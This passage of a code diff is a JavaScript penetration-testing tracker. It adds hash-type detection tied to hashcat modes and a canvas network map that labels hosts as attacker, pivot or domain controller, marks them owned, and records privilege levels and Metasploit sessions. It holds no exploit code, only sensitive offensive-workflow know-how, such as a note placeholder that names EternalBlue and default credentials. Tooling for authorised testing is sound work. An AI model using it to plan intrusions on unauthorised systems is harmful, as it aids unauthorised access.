+  {rx:/^[0-9a-fA-F]{64}$/,                 l:"SHA256 (-m 1400)",     c:"#3b82f6",m:1400},
+  {rx:/^[0-9a-fA-F]{128}$/,               l:"SHA512 (-m 1700)",      c:"#ef4444",m:1700},
+];
+function detectHash(h){
+  if(!h)return null;
+  h=h.trim();
+  for(const e of HASH_PREFIXES){if(h.startsWith(e.p))return{l:e.l,c:e.c,m:e.m};}
+  for(const e of HASH_PATTERNS){if(e.rx.test(h))return{l:e.l,c:e.c,m:e.m};}
+  return null;
+}
+
+function svcTag(port){const tag=SVC_TAGS[parseInt(port)];if(!tag)return '';return `<span class="svc-tag" style="background:${tag.bg};color:${tag.c};border:1px solid ${tag.c}44">${tag.l}</span>`;}
+
+function relevantChecks(target){
+  const open=new Set(target.ports.map(p=>parseInt(p.port)).filter(Boolean));
+  return TARGET_CHECKS.filter(c=>c.ports.length===0||c.ports.some(p=>open.has(p)));
+}
+
+/* ================================================================ NETWORK MAP ================================================================ */
+let mapCtx=null,mapCvs=null,dragNode=null,dragOff={x:0,y:0},linkMode=false,linkFrom=null,hoverNode=null;
+// Zoom & pan state
+let mapZoom=1,mapPanX=0,mapPanY=0,isPanning=false,panStart={x:0,y:0};
+
+// Status → border/accent color
+const NODE_COLORS={Kali:"#3b82f6",Enumerated:"#64748b","In Progress":"#f59e0b",Owned:"#10b981",Unknown:"#64748b"};
+
+// Role definitions: tag shown on node, role chip color, description for tooltip
+const ROLE_DEFS={
+  "":          {tag:"",    rc:"#334155", desc:""},
+  kali:        {tag:"KALI",rc:"#3b82f6", desc:"Attacker machine"},
+  pivot:       {tag:"PVT", rc:"#a855f7", desc:"Pivot / relay — routes to internal subnet"},
+  web:         {tag:"WEB", rc:"#3b82f6", desc:"Web server (HTTP/HTTPS)"},
+  db:          {tag:"DB",  rc:"#ef4444", desc:"Database server"},
+  dc:          {tag:"DC",  rc:"#f59e0b", desc:"Domain Controller — high-value target"},
+  file:        {tag:"FILE",rc:"#10b981", desc:"File / SMB share server"},
+  mail:        {tag:"MAIL",rc:"#0ea5e9", desc:"Mail server (SMTP/IMAP)"},
+  gateway:     {tag:"GW",  rc:"#f97316", desc:"Gateway / firewall / router"},
+  workstation: {tag:"WS",  rc:"#64748b", desc:"Workstation / client machine"},
+  unknown:     {tag:"?",   rc:"#475569", desc:"Unknown role"},
+};
+
+// Privilege level indicator
+const PRIV_COLORS={
+  "":     {c:"#334155",l:""},
+  none:   {c:"#334155",l:""},
+  user:   {c:"#64748b",l:"USR"},
+  admin:  {c:"#f97316",l:"ADM"},
+  root:   {c:"#ef4444",l:"ROOT"},
+  system: {c:"#ef4444",l:"SYS"},
+};
+
+const NODE_W=172,NODE_H=86;
+
+function rMap(){
+  return `<div class="map-toolbar">
+    <button class="btn" onclick="addMapNode()">+ Node</button>
+    <button class="btn" onclick="startLink()">+ Connection</button>
+    <button class="btn" onclick="syncFromTargets()">Sync Targets</button>
+    <button class="btn btn-danger" onclick="delSelected()">Delete Selected</button>
+    <span style="color:var(--text-darkest);margin:0 4px">|</span>
+    <button class="btn btn-blue" onclick="mapZoomIn()">+</button>
+    <button class="btn btn-blue" onclick="mapZoomOut()">−</button>
+    <button class="btn btn-blue" onclick="mapFitAll()">Fit</button>
+    <button class="btn btn-blue" onclick="mapResetView()">1:1</button>
+    <span style="font-size:10px;color:var(--text-dark);margin-left:4px" id="mapZoomLabel"></span>
+    <span style="font-size:10px;color:var(--text-dark);margin-left:8px" id="mapStatus">Drag nodes · Grab empty space to pan · Scroll to zoom</span>
+  </div>
+  <canvas id="mapCanvas" width="900" height="540"></canvas>
+  <div style="display:flex;gap:16px;flex-wrap:wrap;margin-top:8px;align-items:flex-start;">
+    <div>
+      <div style="font-size:9px;color:#475569;font-weight:700;letter-spacing:0.5px;margin-bottom:5px;">STATUS</div>
+      <div class="map-legend">
+        <div class="map-legend-item"><div class="map-legend-dot" style="background:#3b82f6"></div>Kali</div>
+        <div class="map-legend-item"><div class="map-legend-dot" style="background:#64748b"></div>Enumerated</div>
+        <div class="map-legend-item"><div class="map-legend-dot" style="background:#f59e0b"></div>In Progress</div>
+        <div class="map-legend-item"><div class="map-legend-dot" style="background:#10b981"></div>Owned</div>
+      </div>
+    </div>
+    <div>
+      <div style="font-size:9px;color:#475569;font-weight:700;letter-spacing:0.5px;margin-bottom:5px;">ROLE TAGS</div>
+      <div class="map-legend">
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#a855f7;background:#a855f722;border:1px solid #a855f744;padding:1px 4px;border-radius:2px">PVT</span>Pivot</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#3b82f6;background:#3b82f622;border:1px solid #3b82f644;padding:1px 4px;border-radius:2px">WEB</span>Web</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#ef4444;background:#ef444422;border:1px solid #ef444444;padding:1px 4px;border-radius:2px">DB</span>Database</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#f59e0b;background:#f59e0b22;border:1px solid #f59e0b44;padding:1px 4px;border-radius:2px">DC</span>Domain Ctrl</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#10b981;background:#10b98122;border:1px solid #10b98144;padding:1px 4px;border-radius:2px">FILE</span>File Server</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#f97316;background:#f9731622;border:1px solid #f9731644;padding:1px 4px;border-radius:2px">GW</span>Gateway</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#64748b;background:#64748b22;border:1px solid #64748b44;padding:1px 4px;border-radius:2px">WS</span>Workstation</div>
+      </div>
+    </div>
+    <div>
+      <div style="font-size:9px;color:#475569;font-weight:700;letter-spacing:0.5px;margin-bottom:5px;">PRIVILEGE</div>
+      <div class="map-legend">
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#64748b;background:#64748b22;border:1px solid #64748b44;padding:1px 4px;border-radius:2px">USR</span>User</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#f97316;background:#f9731622;border:1px solid #f9731644;padding:1px 4px;border-radius:2px">ADM</span>Admin</div>
+        <div class="map-legend-item"><span style="font-size:9px;font-weight:700;color:#ef4444;background:#ef444422;border:1px solid #ef444444;padding:1px 4px;border-radius:2px">ROOT</span>Root/SYSTEM</div>
+      </div>
+    </div>
+  </div>
+  <div class="map-help"><b style="color:#94a3b8">Controls:</b> Drag node to move · Grab empty space to pan · Scroll to zoom · Dbl-click to edit · Shift+drag also pans</div>
+  <div id="mapModal"></div>`;
+}
+
+function initMap(){
+  mapCvs=document.getElementById("mapCanvas");if(!mapCvs)return;
+  const w=mapCvs.parentElement.offsetWidth-2;mapCvs.width=Math.max(w,600);mapCvs.height=520;
+  mapCtx=mapCvs.getContext("2d");
+  if(S.mapNodes.length===0){S.mapNodes.push({id:uid(),label:"KALI",ip:"Attacker",subnet:"",os:"Kali",status:"Kali",x:40,y:224,selected:false});save();}
+  mapCvs.onmousedown=mapMouseDown;mapCvs.onmousemove=mapMouseMove;
+  mapCvs.onmouseup=mapMouseUp;mapCvs.ondblclick=mapDblClick;
+  mapCvs.onmouseleave=()=>{hoverNode=null;isPanning=false;drawMap();};
+  mapCvs.oncontextmenu=e=>e.preventDefault();
+  // Scroll to zoom
+  mapCvs.addEventListener("wheel",e=>{
+    e.preventDefault();
+    const r=mapCvs.getBoundingClientRect();
+    const mx=e.clientX-r.left,my=e.clientY-r.top;
+    // Zoom toward cursor
+    const oldZoom=mapZoom;
+    const delta=e.deltaY>0?-0.1:0.1;
+    mapZoom=Math.max(0.2,Math.min(5,mapZoom+delta));
+    const scale=mapZoom/oldZoom;
+    mapPanX=mx-(mx-mapPanX)*scale;
+    mapPanY=my-(my-mapPanY)*scale;
+    updateZoomLabel();drawMap();
+  },{passive:false});
+  updateZoomLabel();drawMap();
+}
+
+// Convert screen coords to world coords (accounting for pan+zoom)
+function s2w(sx,sy){return{x:(sx-mapPanX)/mapZoom,y:(sy-mapPanY)/mapZoom};}
+function updateZoomLabel(){const el=document.getElementById("mapZoomLabel");if(el)el.textContent=`${Math.round(mapZoom*100)}%`;}
+
+function nodeAt(mx,my){const w=s2w(mx,my);for(let i=S.mapNodes.length-1;i>=0;i--){const n=S.mapNodes[i];if(w.x>=n.x&&w.x<=n.x+NODE_W&&w.y>=n.y&&w.y<=n.y+NODE_H)return n;}return null;}
+
+function mapMouseDown(e){
+  const r=mapCvs.getBoundingClientRect();const mx=e.clientX-r.left,my=e.clientY-r.top;
+  // Middle-click, right-click, or shift+left = explicit pan
+  if(e.button===1||e.button===2||(e.button===0&&e.shiftKey)){isPanning=true;panStart={x:mx-mapPanX,y:my-mapPanY};return;}
+  const n=nodeAt(mx,my);
+  // Link mode handling
+  if(linkMode&&n){if(!linkFrom){linkFrom=n;setMapStatus("Click destination…");drawMap();return;}
+    if(n.id!==linkFrom.id){showEdgeModal(linkFrom.id,n.id);linkMode=false;linkFrom=null;setMapStatus("Drag nodes · Grab empty space to pan · Scroll to zoom");}return;}
+  S.mapNodes.forEach(nd=>nd.selected=false);S.mapEdges.forEach(ed=>ed.selected=false);
+  if(n){
+    // Left-click on node = select + drag node
+    const w=s2w(mx,my);n.selected=true;dragNode=n;dragOff={x:w.x-n.x,y:w.y-n.y};
+  } else {
+    // Left-click on empty space = check for edge, otherwise pan
+    const edge=edgeAt(mx,my);
+    if(edge){edge.selected=true;}
+    else{isPanning=true;panStart={x:mx-mapPanX,y:my-mapPanY};mapCvs.style.cursor="grabbing";}
+  }
+  drawMap();
+}
+function mapMouseMove(e){
+  const r=mapCvs.getBoundingClientRect();const mx=e.clientX-r.left,my=e.clientY-r.top;
+  if(isPanning){mapPanX=mx-panStart.x;mapPanY=my-panStart.y;drawMap();return;}
+  if(dragNode){const w=s2w(mx,my);dragNode.x=w.x-dragOff.x;dragNode.y=w.y-dragOff.y;hoverNode=null;drawMap();return;}
+  const n=nodeAt(mx,my);
+  mapCvs.style.cursor=n?"pointer":"grab";
+  if(n!==hoverNode){hoverNode=n;drawMap();}
+}
+function mapMouseUp(e){if(isPanning){isPanning=false;mapCvs.style.cursor="grab";return;}if(dragNode)save();dragNode=null;}
+function mapDblClick(e){const r=mapCvs.getBoundingClientRect();const n=nodeAt(e.clientX-r.left,e.clientY-r.top);if(n)showNodeModal(n);}
+
+function edgeAt(mx,my){
+  const w=s2w(mx,my);
+  for(const ed of S.mapEdges){
+    const a=S.mapNodes.find(n=>n.id===ed.from);const b=S.mapNodes.find(n=>n.id===ed.to);if(!a||!b)continue;
+    const ax=a.x+NODE_W/2,ay=a.y+NODE_H/2,bx=b.x+NODE_W/2,by=b.y+NODE_H/2;
+    const len=Math.sqrt((bx-ax)**2+(by-ay)**2);if(len===0)continue;
+    const t=Math.max(0,Math.min(1,((w.x-ax)*(bx-ax)+(w.y-ay)*(by-ay))/(len*len)));
+    const px=ax+t*(bx-ax),py=ay+t*(by-ay);if(Math.sqrt((w.x-px)**2+(w.y-py)**2)<8/mapZoom)return ed;
+  }return null;
+}
+
+function mapPal(){
+  if(S.theme==="red") return {
+    grid:"#1a0f0f",bg:"#0e0505",nodeBg:"#1a0f0f",nodeHov:"#241515",
+    text:"#fde8e8",textDim:"#d4a0a0",textMuted:"#9a6b6b",textDark:"#7a5050",textDarkest:"#5a3838",
+    edge:"#5a3838",edgeSel:"#f87171",accent:"#f87171",
+    tooltipBg:"#1a0f0ff2",tooltipBorder:"#5a3838",
+    labelBg:"#150a0add",linkHighlight:"#f8717155",
+    kali:"#60a5fa",enumerated:"#9a6b6b",inProgress:"#fbbf24",owned:"#f87171"
+  };
+  return {
+    grid:"#111827",bg:"#0a0f1e",nodeBg:"#111827",nodeHov:"#182030",
+    text:"#e2e8f0",textDim:"#94a3b8",textMuted:"#64748b",textDark:"#475569",textDarkest:"#334155",
+    edge:"#334155",edgeSel:"#10b981",accent:"#10b981",
+    tooltipBg:"#0e1624f2",tooltipBorder:"#334155",
+    labelBg:"#0c1322dd",linkHighlight:"#10b98155",
+    kali:"#3b82f6",enumerated:"#64748b",inProgress:"#f59e0b",owned:"#10b981"
+  };
+}
+function nodeCol(status){const p=mapPal();const m={Kali:p.kali,Enumerated:p.enumerated,"In Progress":p.inProgress,Owned:p.owned};return m[status]||p.enumerated;}
+
+function drawMap(){
+  if(!mapCtx)return;const ctx=mapCtx;const P=mapPal();ctx.clearRect(0,0,mapCvs.width,mapCvs.height);
+  // Apply zoom/pan transform
+  ctx.save();
+  ctx.translate(mapPanX,mapPanY);
+  ctx.scale(mapZoom,mapZoom);
+  // grid
+  // Calculate visible world bounds for grid
+  const vx0=-mapPanX/mapZoom,vy0=-mapPanY/mapZoom;
+  const vx1=(mapCvs.width-mapPanX)/mapZoom,vy1=(mapCvs.height-mapPanY)/mapZoom;
+  ctx.strokeStyle=P.grid;ctx.lineWidth=1/mapZoom;
+  const gs=40;
+  for(let x=Math.floor(vx0/gs)*gs;x<vx1;x+=gs){ctx.beginPath();ctx.moveTo(x,vy0);ctx.lineTo(x,vy1);ctx.stroke();}
+  for(let y=Math.floor(vy0/gs)*gs;y<vy1;y+=gs){ctx.beginPath();ctx.moveTo(vx0,y);ctx.lineTo(vx1,y);ctx.stroke();}
+  // subnet groups
+  const subnets={};S.mapNodes.forEach(n=>{if(n.subnet){if(!subnets[n.subnet])subnets[n.subnet]=[];subnets[n.subnet].push(n);}});
+  const subColors=S.theme==="red"?["#f87171","#fbbf24","#fb923c","#c084fc","#22d3ee"]:["#10b981","#3b82f6","#f59e0b","#a855f7","#ef4444"];let si=0;
+  for(const [sub,nodes] of Object.entries(subnets)){
+    if(!nodes.length)continue;let minX=Infinity,minY=Infinity,maxX=-Infinity,maxY=-Infinity;
+    nodes.forEach(n=>{minX=Math.min(minX,n.x);minY=Math.min(minY,n.y);maxX=Math.max(maxX,n.x+NODE_W);maxY=Math.max(maxY,n.y+NODE_H);});
+    const pad=20,col=subColors[si%subColors.length];
+    ctx.fillStyle=col+"0d";ctx.strokeStyle=col+"33";ctx.lineWidth=1;ctx.setLineDash([4,4]);
+    ctx.beginPath();ctx.roundRect(minX-pad,minY-pad,maxX-minX+pad*2,maxY-minY+pad*2,8);ctx.fill();ctx.stroke();ctx.setLineDash([]);
+    ctx.fillStyle=col+"88";ctx.font="600 10px 'JetBrains Mono',monospace";ctx.fillText(sub,minX-pad+6,minY-pad+12);si++;
+  }
+  // edges
+  S.mapEdges.forEach(ed=>{
+    const a=S.mapNodes.find(n=>n.id===ed.from);const b=S.mapNodes.find(n=>n.id===ed.to);if(!a||!b)return;
+    const ax=a.x+NODE_W/2,ay=a.y+NODE_H/2,bx=b.x+NODE_W/2,by=b.y+NODE_H/2;
+    // Calculate intersection of line with target node rectangle
+    const dx=ax-bx,dy=ay-by;const absDx=Math.abs(dx),absDy=Math.abs(dy);
+    let tipX,tipY;
+    if(absDx*NODE_H>absDy*NODE_W){
+      // Line hits left or right edge
+      const sign=dx>0?1:-1;tipX=bx+sign*(NODE_W/2+2);tipY=by+sign*(NODE_W/2+2)*(dy/dx);
+    } else if(absDy>0){
+      // Line hits top or bottom edge
+      const sign=dy>0?1:-1;tipY=by+sign*(NODE_H/2+2);tipX=bx+sign*(NODE_H/2+2)*(dx/dy);
+    } else {tipX=bx;tipY=by;}
+    const angle=Math.atan2(by-ay,bx-ax);
+    // Draw line from source center to tip
+    ctx.beginPath();ctx.moveTo(ax,ay);ctx.lineTo(tipX,tipY);ctx.strokeStyle=ed.selected?P.edgeSel:P.edge;ctx.lineWidth=ed.selected?2.5:1.5;ctx.stroke();
+    // Arrowhead at tip
+    ctx.beginPath();ctx.moveTo(tipX,tipY);ctx.lineTo(tipX-10*Math.cos(angle-0.4),tipY-10*Math.sin(angle-0.4));ctx.lineTo(tipX-10*Math.cos(angle+0.4),tipY-10*Math.sin(angle+0.4));
+    ctx.closePath();ctx.fillStyle=ed.selected?P.edgeSel:P.edge;ctx.fill();
+    if(ed.label){const mx2=(ax+bx)/2,my2=(ay+by)/2;ctx.font="600 9px 'JetBrains Mono',monospace";const tw=ctx.measureText(ed.label).width;
+      ctx.fillStyle=P.labelBg;ctx.fillRect(mx2-tw/2-4,my2-7,tw+8,14);ctx.fillStyle=ed.selected?P.edgeSel:P.textDim;ctx.fillText(ed.label,mx2-tw/2,my2+3);}
+  });
+  // nodes
+  S.mapNodes.forEach(n=>{
+    const col=nodeCol(n.status);
+    const isHov=hoverNode&&hoverNode.id===n.id;
+    const role=ROLE_DEFS[n.role||""]||ROLE_DEFS[""];
+    const priv=PRIV_COLORS[n.priv||""]||PRIV_COLORS[""];
+    const isPivot=n.role==="pivot";
+
+    // pivot outer dashed ring
+    if(isPivot){
+      ctx.strokeStyle=(S.theme==="red"?"#c084fc66":"#a855f766");ctx.lineWidth=1.5;ctx.setLineDash([5,4]);
+      ctx.beginPath();ctx.roundRect(n.x-6,n.y-6,NODE_W+12,NODE_H+12,10);ctx.stroke();
+      ctx.setLineDash([]);
+    }
+
+    // shadow
+    ctx.fillStyle="#00000033";ctx.beginPath();ctx.roundRect(n.x+2,n.y+2,NODE_W,NODE_H,6);ctx.fill();
+
+    // body
+    ctx.fillStyle=isHov?P.nodeHov:P.nodeBg;
+    ctx.strokeStyle=n.selected?col:isHov?col:col+"66";
+    ctx.lineWidth=n.selected?2.5:isHov?2:1.5;
+    ctx.beginPath();ctx.roundRect(n.x,n.y,NODE_W,NODE_H,6);ctx.fill();ctx.stroke();
+
+    // top accent bar
+    ctx.fillStyle=col;ctx.fillRect(n.x+1,n.y+1,NODE_W-2,3);
+
+    // role pill (top-left)
+    if(role.tag){
+      const pillW=ctx.measureText(role.tag).width+10;
+      ctx.font="700 8px 'JetBrains Mono',monospace";
+      const pw=ctx.measureText(role.tag).width+8;
+      ctx.fillStyle=role.rc+"33";
+      ctx.strokeStyle=role.rc+"88";ctx.lineWidth=1;
+      ctx.beginPath();ctx.roundRect(n.x+5,n.y+7,pw,12,3);ctx.fill();ctx.stroke();
+      ctx.fillStyle=role.rc;
+      ctx.fillText(role.tag,n.x+9,n.y+16);
+    }
+
+    // priv indicator (top-right, colored dot + label)
+    if(priv.l){
+      ctx.font="700 8px 'JetBrains Mono',monospace";
+      const pw=ctx.measureText(priv.l).width+8;
+      ctx.fillStyle=priv.c+"33";
+      ctx.strokeStyle=priv.c+"88";ctx.lineWidth=1;
+      ctx.beginPath();ctx.roundRect(n.x+NODE_W-pw-5,n.y+7,pw,12,3);ctx.fill();ctx.stroke();
+      ctx.fillStyle=priv.c;
+      ctx.fillText(priv.l,n.x+NODE_W-pw-1,n.y+16);
+    }
+
+    // label / hostname  (row 1)
+    ctx.font="700 11px 'JetBrains Mono',monospace";ctx.fillStyle=P.text;
+    const labelY=role.tag?n.y+30:n.y+22;
+    ctx.fillText(truncText(ctx,n.label||"?",NODE_W-16),n.x+8,labelY);
+
+    // IP (row 2)
+    ctx.font="400 10px 'JetBrains Mono',monospace";ctx.fillStyle=col;
+    ctx.fillText(truncText(ctx,n.ip||"",NODE_W-16),n.x+8,labelY+14);
+
+    // row 3: OS · status
+    ctx.font="600 9px 'JetBrains Mono',monospace";ctx.fillStyle=P.textDark;
+    const info=[n.os,n.status].filter(Boolean).join(" · ");
+    ctx.fillText(truncText(ctx,info,NODE_W-16),n.x+8,labelY+27);
+
+    // row 4: session# or notes snippet
+    const extra=[];
+    if(n.session)extra.push("sess:"+n.session);
+    if(n.notes)extra.push(n.notes.slice(0,22));
+    if(extra.length){
+      ctx.font="9px 'JetBrains Mono',monospace";ctx.fillStyle=P.textDarkest;
+      ctx.fillText(truncText(ctx,extra.join(" | "),NODE_W-16),n.x+8,labelY+40);
+    }
+
+    // port count badge (top-right corner of accent bar)
+    const tgt=S.targets.find(t=>t.ip===n.ip);
+    if(tgt){
+      const pc=tgt.ports.filter(p=>p.port).length;
+      if(pc>0){ctx.font="700 9px 'JetBrains Mono',monospace";ctx.fillStyle=col+"cc";ctx.fillText(`${pc}p`,n.x+NODE_W-26,n.y+4+(role.tag||priv.l?0:0));}
+    }
+  });
+  // Link mode highlight (still in world space)
+  if(linkMode&&linkFrom){const n=linkFrom;ctx.strokeStyle=P.linkHighlight;ctx.lineWidth=2/mapZoom;ctx.setLineDash([6/mapZoom,4/mapZoom]);ctx.beginPath();ctx.roundRect(n.x-4,n.y-4,NODE_W+8,NODE_H+8,10);ctx.stroke();ctx.setLineDash([]);}
+  // Restore to screen space for tooltip
+  ctx.restore();
+  // hover tooltip (drawn in screen space so it doesn't scale weirdly)
+  if(hoverNode){
+    const n=hoverNode;
+    const tgt=S.targets.find(t=>t.ip===n.ip);
+    const openPorts=tgt?tgt.ports.filter(p=>p.port):[];
+    const role=ROLE_DEFS[n.role||""]||ROLE_DEFS[""];
+    const priv=PRIV_COLORS[n.priv||""]||PRIV_COLORS[""];
+    const ttLines=[];
+    if(role.desc) ttLines.push({text:role.desc, color:S.theme==="red"?"#c084fc":"#a855f7", bold:false});
+    if(n.session) ttLines.push({text:`Session: ${n.session}`, color:P.accent, bold:true});
+    if(n.notes)   ttLines.push({text:n.notes, color:S.theme==="red"?"#fbbf24":"#f59e0b", bold:false});
+    if(priv.l)    ttLines.push({text:`Priv: ${priv.l}`, color:priv.c, bold:true});
+    if(openPorts.length) ttLines.push({text:"— PORTS —", color:P.textDarkest, bold:false});
+    openPorts.forEach(p=>{
+      const tag=SVC_TAGS[parseInt(p.port)];const hint=PH[parseInt(p.port)]||"";
+      const hintShort=hint.includes("→")?hint.split("→").slice(1).join("→").trim():"";
+      ttLines.push({text:`${p.port} ${p.service||""}${hintShort?" → "+hintShort:""}`, color:tag?tag.c:P.textMuted, bold:false});
+    });
+    if(ttLines.length>0){
+      // Convert node position to screen coords for tooltip placement
+      const snx=n.x*mapZoom+mapPanX, sny=n.y*mapZoom+mapPanY;
+      const snw=NODE_W*mapZoom;
+      const PAD=10, LH=16, TW=350;
+      const TH=ttLines.length*LH+PAD*2+4;
+      let tx=snx+snw+10, ty=sny;
+      if(tx+TW>mapCvs.width) tx=snx-TW-10;
+      if(ty+TH>mapCvs.height) ty=mapCvs.height-TH-4;
+      if(ty<0)ty=4;
+      ctx.fillStyle=P.tooltipBg;ctx.strokeStyle=P.tooltipBorder;ctx.lineWidth=1;
+      ctx.beginPath();ctx.roundRect(tx,ty,TW,TH,6);ctx.fill();ctx.stroke();
+      ttLines.forEach((l,i)=>{
+        ctx.font=`${l.bold?"600 ":""}10px 'JetBrains Mono',monospace`;
+        ctx.fillStyle=l.color;
+        ctx.fillText(truncText(ctx,l.text,TW-PAD*2),tx+PAD,ty+PAD+12+i*LH);
+      });
+    }
+  }
+}
+
+function truncText(ctx,text,maxW){if(ctx.measureText(text).width<=maxW)return text;while(text.length>0&&ctx.measureText(text+"…").width>maxW)text=text.slice(0,-1);return text+"…";}
+function setMapStatus(msg){const el=document.getElementById("mapStatus");if(el)el.textContent=msg;}
+function mapZoomIn(){mapZoom=Math.min(5,mapZoom*1.25);updateZoomLabel();drawMap();}
+function mapZoomOut(){mapZoom=Math.max(0.2,mapZoom/1.25);updateZoomLabel();drawMap();}
+function mapResetView(){mapZoom=1;mapPanX=0;mapPanY=0;updateZoomLabel();drawMap();}
+function mapFitAll(){
+  if(!S.mapNodes.length||!mapCvs)return;
+  let minX=Infinity,minY=Infinity,maxX=-Infinity,maxY=-Infinity;
+  S.mapNodes.forEach(n=>{minX=Math.min(minX,n.x);minY=Math.min(minY,n.y);maxX=Math.max(maxX,n.x+NODE_W);maxY=Math.max(maxY,n.y+NODE_H);});
+  const pad=40,worldW=maxX-minX+pad*2,worldH=maxY-minY+pad*2;
+  const scaleX=mapCvs.width/worldW,scaleY=mapCvs.height/worldH;
+  mapZoom=Math.max(0.2,Math.min(3,Math.min(scaleX,scaleY)));
+  mapPanX=mapCvs.width/2-((minX+maxX)/2)*mapZoom;
+  mapPanY=mapCvs.height/2-((minY+maxY)/2)*mapZoom;
+  updateZoomLabel();drawMap();
+}
+function addMapNode(){showNodeModal(null);}
+function startLink(){linkMode=true;linkFrom=null;setMapStatus("Click the source node…");}
+function delSelected(){
+  S.mapNodes=S.mapNodes.filter(n=>!n.selected);const ids=new Set(S.mapNodes.map(n=>n.id));
+  S.mapEdges=S.mapEdges.filter(e=>!e.selected&&ids.has(e.from)&&ids.has(e.to));save();tabs();drawMap();
+}
+function syncFromTargets(){
+  const ex=new Set(S.mapNodes.map(n=>n.ip));let added=0;
+  S.targets.forEach(t=>{if(t.ip&&!ex.has(t.ip)){S.mapNodes.push({id:uid(),label:t.hostname||t.ip,ip:t.ip,subnet:"",os:t.os||"",status:t.status||"Enumerated",x:200+(S.mapNodes.length-1)%4*180,y:40+Math.floor((S.mapNodes.length-1)/4)*110,selected:false});ex.add(t.ip);added++;}});
+  if(added){save();mapFitAll();}setMapStatus(added?`Synced ${added} new node(s)`:"All targets on map");tabs();drawMap();
+}
+function showNodeModal(existing){
+  const isEdit=!!existing;
+  const n=existing||{label:"",ip:"",subnet:"",os:"",status:"Enumerated",role:"",priv:"",session:"",notes:""};
+  const optRole=[
+    {v:"",l:"— Select role —"},{v:"kali",l:"KALI — Attacker"},{v:"pivot",l:"PIVOT — Relay/pivot point"},
+    {v:"web",l:"WEB — Web server"},{v:"db",l:"DB — Database server"},{v:"dc",l:"DC — Domain Controller"},
+    {v:"file",l:"FILE — File/SMB server"},{v:"mail",l:"MAIL — Mail server"},
+    {v:"gateway",l:"GW — Gateway/Firewall"},{v:"workstation",l:"WS — Workstation"},
+    {v:"unknown",l:"? — Unknown"},
+  ];
+  const optPriv=[
+    {v:"",l:"— Privilege level —"},{v:"none",l:"None / no shell"},
+    {v:"user",l:"User (low priv)"},{v:"admin",l:"Admin (local/domain)"},
+    {v:"root",l:"Root (Linux)"},{v:"system",l:"SYSTEM (Windows)"},
+  ];
+  const selRole=optRole.map(o=>`<option value="${o.v}"${(n.role||"")===(o.v)?" selected":""}>${o.l}</option>`).join("");
+  const selPriv=optPriv.map(o=>`<option value="${o.v}"${(n.priv||"")===(o.v)?" selected":""}>${o.l}</option>`).join("");
+  const selOS=`<option value="" ${(n.os||"")===""?"selected":""}>Unknown</option><option value="Linux" ${n.os==="Linux"?"selected":""}>Linux</option><option value="Windows" ${n.os==="Windows"?"selected":""}>Windows</option>`;
+  const selStatus=`<option value="Kali" ${n.status==="Kali"?"selected":""}>Kali (Attacker)</option><option value="Enumerated" ${n.status==="Enumerated"?"selected":""}>Enumerated</option><option value="In Progress" ${n.status==="In Progress"?"selected":""}>In Progress</option><option value="Owned" ${n.status==="Owned"?"selected":""}>Owned</option>`;
+
+  document.getElementById("mapModal").innerHTML=`<div class="map-modal"><div class="map-modal-box" style="min-width:380px">
+    <div class="map-modal-title">${isEdit?"EDIT":"ADD"} NODE</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+      <div class="map-modal-row"><label>LABEL / HOSTNAME</label><input class="fi" id="nm_label" value="${esc(n.label||"")}" style="width:100%"></div>
+      <div class="map-modal-row"><label>IP ADDRESS</label><input class="fi" id="nm_ip" value="${esc(n.ip||"")}" style="width:100%"></div>
+      <div class="map-modal-row"><label>SUBNET (e.g. 10.10.10.0/24)</label><input class="fi" id="nm_subnet" value="${esc(n.subnet||"")}" style="width:100%"></div>
+      <div class="map-modal-row"><label>SESSION # (MSF)</label><input class="fi" id="nm_session" value="${esc(n.session||"")}" placeholder="e.g. 3" style="width:100%"></div>
+      <div class="map-modal-row"><label>OS</label><select class="fi" id="nm_os" style="width:100%">${selOS}</select></div>
+      <div class="map-modal-row"><label>STATUS</label><select class="fi" id="nm_status" style="width:100%">${selStatus}</select></div>
+      <div class="map-modal-row"><label>ROLE</label><select class="fi" id="nm_role" style="width:100%">${selRole}</select></div>
+      <div class="map-modal-row"><label>PRIVILEGE LEVEL</label><select class="fi" id="nm_priv" style="width:100%">${selPriv}</select></div>
+    </div>
+    <div class="map-modal-row" style="margin-top:6px"><label>NOTES (shown on node)</label><input class="fi" id="nm_notes" value="${esc(n.notes||"")}" placeholder="e.g. EternalBlue, creds: admin/admin, pivot via sess 2" style="width:100%"></div>
+    <div class="map-modal-actions"><button class="btn btn-danger" onclick="closeModal()">Cancel</button><button class="btn" onclick="saveNodeModal(${isEdit?"'"+n.id+"'":"null"})">${isEdit?"Save":"Add"}</button></div>
+  </div></div>`;
+}
+function saveNodeModal(existingId){
+  const label=document.getElementById("nm_label").value.trim();
+  const ip=document.getElementById("nm_ip").value.trim();
+  const subnet=document.getElementById("nm_subnet").value.trim();
+  const os=document.getElementById("nm_os").value;
+  const status=document.getElementById("nm_status").value;
+  const role=document.getElementById("nm_role").value;
+  const priv=document.getElementById("nm_priv").value;
+  const session=document.getElementById("nm_session").value.trim();
+  const notes=document.getElementById("nm_notes").value.trim();
+  if(!label&&!ip){closeModal();return;}
+  if(existingId){
+    const n=S.mapNodes.find(nd=>nd.id===existingId);
+    if(n){n.label=label;n.ip=ip;n.subnet=subnet;n.os=os;n.status=status;n.role=role;n.priv=priv;n.session=session;n.notes=notes;}
+  } else {
+    S.mapNodes.push({id:uid(),label:label||ip,ip,subnet,os,status,role,priv,session,notes,
+      x:200+(S.mapNodes.length-1)%4*180,y:40+Math.floor((S.mapNodes.length-1)/4)*120,selected:false});
+  }
+  save();tabs();closeModal();drawMap();
+}
+function showEdgeModal(fromId,toId){
+  const a=S.mapNodes.find(n=>n.id===fromId);const b=S.mapNodes.find(n=>n.id===toId);
+  document.getElementById("mapModal").innerHTML=`<div class="map-modal"><div class="map-modal-box">
+    <div class="map-modal-title">ADD CONNECTION</div>
